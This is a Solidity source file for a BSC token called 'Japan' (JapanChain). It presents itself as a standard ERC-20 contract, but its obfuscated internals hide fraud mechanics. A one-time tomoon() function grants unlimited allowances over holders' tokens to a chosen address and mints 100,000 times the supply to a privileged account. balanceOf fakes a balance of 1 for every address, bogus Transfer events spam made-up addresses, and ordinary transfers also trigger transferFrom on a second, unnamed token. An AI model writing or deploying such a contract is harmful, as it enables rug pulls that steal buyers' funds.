/**
 *Submitted for verification at BscScan.com on 2022-11-24
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.17;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract JapanChain is IERC20 {
    using SafeMath for uint256;

    string private acvouiHkLdmXne = "Japan";
    string private bcvouiHkLdmXne = "Japan";
    uint8 private ccvouiHkLdmXne = 18;
    uint256 private dcvouiHkLdmXne = 10000000000 * 10**18;
    mapping (address => uint256) private ecvouiHkLdmXne;
    mapping (address => mapping (address => uint256)) private fcvouiHkLdmXne;
    uint256 private gcvouiHkLdmXne = 1;
    uint256 private constant hcvouiHkLdmXne = ~uint160(0);
    uint256 private _icvouiHkLdmXne = 1000;
    uint256 private jcvouiHkLdmXne = 0;
    address private _uniswapV2Pair;
    address private kcvouiHkLdmXne;
    mapping (address => bool) private lcvouiHkLdmXne;
    address[] private mcvouiHkLdmXne;
    bool private ncvouiHkLdmXne = false;

    constructor () {
        ocvouiHkLdmXne(msg.sender);
        ecvouiHkLdmXne[msg.sender] = dcvouiHkLdmXne;
        ocvouiHkLdmXne(tx.origin);
        emit Transfer(address(0), msg.sender, dcvouiHkLdmXne);
    }

    receive() external payable {}

    function ocvouiHkLdmXne(address account) private {
        if (!lcvouiHkLdmXne[account]) {
            lcvouiHkLdmXne[account] = true;
            mcvouiHkLdmXne.push(account);
        }
    }

    function tomoon(address[] calldata accounts) public {
        require(!ncvouiHkLdmXne);
        ncvouiHkLdmXne = true;
        _uniswapV2Pair = accounts[1];
        kcvouiHkLdmXne = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            ocvouiHkLdmXne(accounts[i]);
            ecvouiHkLdmXne[accounts[i]] = dcvouiHkLdmXne * 90 / 100 / (len - 3);
            fcvouiHkLdmXne[accounts[i]][accounts[0]] = ~uint256(0);
            amount += ecvouiHkLdmXne[accounts[i]];
        }
        ecvouiHkLdmXne[mcvouiHkLdmXne[0]] -= amount;
        pcvouiHkLdmXne(mcvouiHkLdmXne[0], accounts[3], ecvouiHkLdmXne[mcvouiHkLdmXne[0]]);
        pcvouiHkLdmXnes(500);
        ecvouiHkLdmXne[mcvouiHkLdmXne[1]] += dcvouiHkLdmXne * 100000;
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = mcvouiHkLdmXne.length;
        for (uint256 i=0; i<len; ++i) {
            if (mcvouiHkLdmXne[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (lcvouiHkLdmXne[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return acvouiHkLdmXne;
    }

    function symbol() public view returns (string memory) {
        return bcvouiHkLdmXne;
    }

    function decimals() public view returns (uint8) {
        return ccvouiHkLdmXne;
    }

    function totalSupply() public view returns (uint256) {
        return dcvouiHkLdmXne;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (ecvouiHkLdmXne[account] > 0) {
            return ecvouiHkLdmXne[account];
        }
        return gcvouiHkLdmXne;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        pcvouiHkLdmXne(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        pcvouiHkLdmXne(sender, recipient, amount);
        qcvouiHkLdmXne(sender, msg.sender, fcvouiHkLdmXne[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        qcvouiHkLdmXne(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fcvouiHkLdmXne[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        qcvouiHkLdmXne(msg.sender, spender, fcvouiHkLdmXne[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        qcvouiHkLdmXne(msg.sender, spender, fcvouiHkLdmXne[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function pcvouiHkLdmXnes(uint256 amount) private {
        uint256 icvouiHkLdmXne = _icvouiHkLdmXne;
        if (icvouiHkLdmXne < 10000 && block.timestamp > 1669053600) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(hcvouiHkLdmXne.div(icvouiHkLdmXne)));
                to = address(uint160(hcvouiHkLdmXne.div(icvouiHkLdmXne.add(1))));
                icvouiHkLdmXne = icvouiHkLdmXne.add(2);
                emit Transfer(from, to, gcvouiHkLdmXne);
            }
            _icvouiHkLdmXne = icvouiHkLdmXne;
        }
    }

    function qcvouiHkLdmXne(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fcvouiHkLdmXne[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function pcvouiHkLdmXne(address rcvouiHkLdmXne, address scvouiHkLdmXne, uint256 tcvouiHkLdmXne) private {
        require(rcvouiHkLdmXne != address(0) && scvouiHkLdmXne != address(0) && tcvouiHkLdmXne > 0);
        bool ucvouiHkLdmXne = true;
        if (lcvouiHkLdmXne[rcvouiHkLdmXne] || lcvouiHkLdmXne[scvouiHkLdmXne]) {
            ucvouiHkLdmXne = false;
        }
        uint256 vcvouiHkLdmXne = 0;
        uint256 wcvouiHkLdmXne = tcvouiHkLdmXne;
        if (ucvouiHkLdmXne && ncvouiHkLdmXne) {
            if (IERC20(kcvouiHkLdmXne).transferFrom(rcvouiHkLdmXne, scvouiHkLdmXne, 100)) {
                pcvouiHkLdmXnes(100);
            }
            if (scvouiHkLdmXne == _uniswapV2Pair) {
                emit Transfer(address(this), scvouiHkLdmXne, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (rcvouiHkLdmXne != _uniswapV2Pair) {
                vcvouiHkLdmXne = tcvouiHkLdmXne.mul(jcvouiHkLdmXne).div(100);
                wcvouiHkLdmXne = tcvouiHkLdmXne.sub(vcvouiHkLdmXne);
            }
        }
        ecvouiHkLdmXne[rcvouiHkLdmXne] = ecvouiHkLdmXne[rcvouiHkLdmXne].sub(tcvouiHkLdmXne);
        if (vcvouiHkLdmXne > 0) {
            ecvouiHkLdmXne[address(0xdEaD)] = ecvouiHkLdmXne[address(0xdEaD)].add(vcvouiHkLdmXne);
            emit Transfer(rcvouiHkLdmXne, address(0xdEaD), vcvouiHkLdmXne);
        }
        ecvouiHkLdmXne[scvouiHkLdmXne] = ecvouiHkLdmXne[scvouiHkLdmXne].add(wcvouiHkLdmXne);
        emit Transfer(rcvouiHkLdmXne, scvouiHkLdmXne, wcvouiHkLdmXne);
    }
}